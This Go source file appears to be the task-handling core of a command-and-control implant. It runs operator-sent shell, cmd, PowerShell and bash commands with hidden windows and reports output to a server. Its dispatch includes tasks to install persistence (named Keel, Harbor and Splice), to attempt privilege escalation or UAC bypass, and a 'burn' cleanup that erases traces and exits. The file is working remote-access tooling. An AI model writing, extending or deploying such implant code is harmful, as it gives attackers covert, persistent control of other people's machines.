package runtime

import (
	"bytes"
	"context"
	"errors"
	"os/exec"
	"strings"
	"time"

	"github.com/digitizables/lattice/agent/install"
	agentv1 "github.com/digitizables/lattice/gen/lattice/agent/v1"
)

const (
	shellTimeout   = 60 * time.Second
	maxOutputBytes = 256 * 1024
)

func commandLine(name string, args []string) string {
	parts := make([]string, 0, 1+len(args))
	if name != "" {
		parts = append(parts, name)
	}
	parts = append(parts, args...)
	return strings.TrimSpace(strings.Join(parts, " "))
}

func truncateOutput(s string) string {
	if len(s) <= maxOutputBytes {
		return s
	}
	return s[:maxOutputBytes] + "\n...[truncated: output exceeded 256KiB]"
}

func (a *Agent) runShell(ctx context.Context, taskID, kind, line string) (exitCode int32, stdout, stderr string) {
	line = strings.TrimSpace(line)
	if line == "" {
		return 1, "", "empty command"
	}

	if a.Transport != nil && taskID != "" {
		cancelled, err := a.Transport.MarkRunning(ctx, a.ID, taskID)
		if err != nil {
			a.Log.Warn("mark running failed", "err", err)
		} else if cancelled {
			return 130, "", "cancelled by operator"
		}
	}

	runCtx, cancel := context.WithTimeout(ctx, shellTimeout)
	defer cancel()

	path, argv, err := shellInvocation(kind, line)
	if err != nil {
		return 1, "", err.Error()
	}

	cmd := exec.CommandContext(runCtx, path, argv...)
	a.ensureCwd()
	cmd.Dir = a.Cwd
	hideWindow(cmd)
	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	stopPoll := make(chan struct{})
	if a.Transport != nil && taskID != "" {
		go func() {
			ticker := time.NewTicker(400 * time.Millisecond)
			defer ticker.Stop()
			for {
				select {
				case <-stopPoll:
					return
				case <-runCtx.Done():
					return
				case <-ticker.C:
					pollCtx, pollCancel := context.WithTimeout(context.Background(), 2*time.Second)
					cancelled, pollErr := a.Transport.PollCancel(pollCtx, a.ID, taskID)
					pollCancel()
					if pollErr != nil {
						continue
					}
					if cancelled {
						cancel()
						return
					}
				}
			}
		}()
	}

	runErr := cmd.Run()
	close(stopPoll)

	stdout = truncateOutput(outBuf.String())
	stderr = truncateOutput(errBuf.String())

	if runErr == nil {
		return 0, stdout, stderr
	}
	if errors.Is(runErr, context.Canceled) || errors.Is(runCtx.Err(), context.Canceled) {
		if stderr != "" {
			stderr += "\n"
		}
		stderr += "cancelled by operator"
		return 130, stdout, stderr
	}
	if errors.Is(runErr, context.DeadlineExceeded) || errors.Is(runCtx.Err(), context.DeadlineExceeded) {
		if stderr != "" {
			stderr += "\n"
		}
		stderr += "command timed out"
		return 124, stdout, stderr
	}
	var ee *exec.ExitError
	if errors.As(runErr, &ee) {
		return int32(ee.ExitCode()), stdout, stderr
	}
	if stderr == "" {
		stderr = runErr.Error()
	} else {
		stderr = stderr + "\n" + runErr.Error()
	}
	return 1, stdout, stderr
}

func (a *Agent) runTask(ctx context.Context, t *agentv1.Task) (exitCode int32, stdout, stderr string) {
	name := strings.ToLower(strings.TrimSpace(t.GetName()))
	args := t.GetArgs()
	taskID := t.GetTaskId()

	switch name {
	case "whoami":
		return runBuiltinWhoami()
	case "echo":
		return 0, strings.Join(args, " "), ""
	case "hostname":
		return runBuiltinHostname()
	case "pwd":
		a.ensureCwd()
		return 0, a.Cwd, ""
	case "cd":
		target := ""
		if len(args) > 0 {
			target = strings.Join(args, " ")
		}
		next, err := a.changeDirectory(target)
		if err != nil {
			return 1, "", err.Error()
		}
		return 0, next, ""
	case "shell", "run":
		return a.runShell(ctx, taskID, "default", commandLine("", args))
	case "cmd":
		return a.runShell(ctx, taskID, "cmd", commandLine("", args))
	case "powershell", "ps", "pwsh":
		return a.runShell(ctx, taskID, "powershell", commandLine("", args))
	case "bash", "sh":
		return a.runShell(ctx, taskID, name, commandLine("", args))
	case "persist", "install-service":
		return a.runPersist()
	case "cleanup", "uninstall-all", "burn":
		return a.runCleanup()
	case "update":
		return a.runUpdate(ctx)
	case "elevate", "privesc", "uac":
		return a.runElevate(ctx, taskID, args)
	default:
		return a.runShell(ctx, taskID, "default", commandLine(t.GetName(), args))
	}
}

func (a *Agent) runPersist() (int32, string, string) {
	if a.ServerURL == "" {
		return 1, "", "server URL unknown; restart agent with -server"
	}
	sleep := a.Sleep
	if sleep <= 0 {
		sleep = 5 * time.Second
	}
	method, err := install.Install(install.Options{
		Server:   a.ServerURL,
		IDFile:   a.IDFile,
		Insecure: a.InsecureTLS,
		Sleep:    sleep.String(),
	})
	if err != nil {
		return 1, "", err.Error() + "\n(note: Keel needs elevation; Harbor/Splice are user-level fallbacks)"
	}
	msg := "persistence method " + method + " (" + install.ServiceName() + ")\nbinary " + install.BinaryPath()
	return 0, msg, ""
}

func (a *Agent) runCleanup() (int32, string, string) {
	res, err := install.Cleanup()
	out := strings.Join(res.Steps, "\n")
	a.exitAfterTask = true
	if err != nil {
		return 1, out, err.Error()
	}
	return 0, out + "\nAsh cleanup complete — agent will exit", ""
}
